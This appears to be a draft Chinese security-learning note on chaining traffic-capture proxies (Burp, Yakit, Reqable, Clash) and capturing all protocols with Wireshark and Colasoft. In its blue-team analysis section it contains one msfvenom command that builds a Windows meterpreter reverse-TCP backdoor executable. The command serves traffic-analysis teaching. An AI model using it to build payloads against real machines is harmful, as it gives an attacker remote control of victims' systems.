---
title: 抓包技术&全局协议&通讯双层&多项目联动&网卡模式&检验绕过&移动应用
published: 2026-01-21
description: 暂时还没好。
tags: [基础入门,Web应用,PC应用,移动端应用,Https,Http]
category: 网络安全
draft: true
---

# 知识点

1. [抓包技术-HTTP/S上游下游-项目联动](#演示案例0-抓包技术-HTTP/S上游下游-项目联动)
2. [抓包技术-HTTP/S双层代理-扶墙环境](#演示案例1-抓包技术-HTTP/S双层代理-扶墙环境)
3. [抓包技术-全局协议-WireShark&科来](#演示案例2-抓包技术-全局协议-WireShark&科来)

Wireshark：

https://www.wireshark.org/

网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。

科来网络分析系统：

https://www.colasoft.com.cn/

该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障、安全及性能问题。

## 抓包工具联动

意义：让一个数据包同时经过不同安全测试工具进行扫描。

### 演示案例0-抓包技术-HTTP/S上游下游-项目联动

#### Yakit->Burp

1. Yakit 127.0.0.1:8083，流量优先给到Yakit。
2. 设置下游 127.0.0.1:8888，设置好给到下游的地址。
3. Burp 127.0.0.1:8888，此时Yakit给到下游也就是burp。
4. 系统的代理设置：127.0.0.1:8083

![image-20260120205629361](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120205629361.png)

![image-20260120205640749](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120205640749.png)

![image-20260120210208857](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120210208857.png)

#### Burp->Yakit 

1. Burp 127.0.0.1:8888
2. Yakit 127.0.0.1:8083，此时Yakit的下游就不需要填写。
3. 让Burp将给到Yakit
4. 系统的代理设置：127.0.0.1:8888

![image-20260120210553955](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120210553955.png)

![image-20260120210625309](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120210625309.png)

![image-20260120211003387](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120211003387.png)

#### Burp->Yakit->Reqable

1. Burp 127.0.0.1:8080
2. Yakit 127.0.0.1:8083
3. 让Burp将给到Yakit
4. 系统的代理设置：127.0.0.1:8080
5. Yakit设置下游 127.0.0.1:9000

这个就不做演示了，因为都是一样的道理，学会前两种就可以无限套娃（有效利用几种抓包软件的插件）。

### 演示案例1-抓包技术-HTTP/S双层代理-扶墙环境

**解决：**

1. 目标需要踩梯子才能访问。
2. 隐藏真实IP去访问并进行抓包。

#### Clash+Burp

首先把系统代理设置成和burp一样的，之就和burp设置下游给Yakit是一样的操作，clash默认端口是7890。

![image-20260120212322926](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120212322926.png)

![image-20260120212531828](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120212531828.png)

#### Clash+Yakit

同上，只需要把系统代理设置为Yakit相同的，再给下游地址设置成7890端口即可。

![image-20260120212815624](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120212815624.png)

## 思考

如果是需要访问小程序或者app该如何操作（不能正常访问到的）？（待实践）





## 全局协议抓包

WireShark 科来网络系统

1. 解决部分代理校验

   有部分的app、Web、小程序，当设置了代理后无法抓包。

   校验：检测到了当前机器的代理设置，做了一个策略防止。

   做了代理的设置数据走向：本身应用-代理-还没有到网卡-给到监听抓包工具。

   没有做代理的数据走向：本身应用-服务器（网卡抓包） 代理是在网卡之前产生。

2. APP/小程序/PC应用

   由于应用类型不同，不是说所有的应用都有https协议的数据。

3. 蓝队分析TCP/UDP应用

```cmd
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.9 lport=6666 -f exe -o 9.exe
```

### 演示案例2-抓包技术-全局协议-WireShark&科来

#### 科来

![image-20260120214244234](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260120214244234.png)
